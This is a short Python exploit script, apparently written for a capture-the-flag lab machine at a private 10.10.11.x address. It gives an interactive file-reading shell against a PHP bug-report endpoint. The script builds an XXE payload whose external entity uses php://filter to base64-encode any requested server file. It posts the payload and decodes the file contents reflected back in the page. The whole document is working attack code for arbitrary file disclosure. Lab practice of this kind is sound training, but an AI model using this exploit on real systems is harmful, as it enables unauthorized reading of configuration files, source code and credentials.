#!/usr/bin/python3

import time, signal, requests, urllib, sys, re, os
from base64 import b64encode, b64decode

def closeSignal(sig, frame):
	print("\n\n[*]Exiting...\n")
	sys.exit(1)

signal.signal(signal.SIGINT, closeSignal)

main_url = "http://10.10.11.100/tracker_diRbPr00f314.php"

def makeRequest(base):
	post_data = {
	"data" : base
	}
	r = requests.post(main_url, data=post_data)
	response = re.findall("<td>Title:<\/td>\n.+<td>(.*?)<\/td>", r.text)[0]
	return response

def base64encode(file):
	xml = """<?xml  version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [
	<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource="""+ file +"""\">]>
			<bugreport>
			<title>&ac;</title>
			<cwe>road</cwe>
			<cvss>to</cvss>
			<reward>OSCP</reward>
			</bugreport>"""

	xml = xml.encode()
	xml = b64encode(xml).decode()
	return xml

def base64decode(encode):
	decoded = b64decode(encode).decode()
	return decoded

if __name__ == '__main__':

	while True:
		file = input("file> ")
		if file == "exit":
			sys.exit(1)

		if file == "clear":
			os.system("clear")
			continue

		base = base64encode(file)
		response = makeRequest(base)
		print(base64decode(response))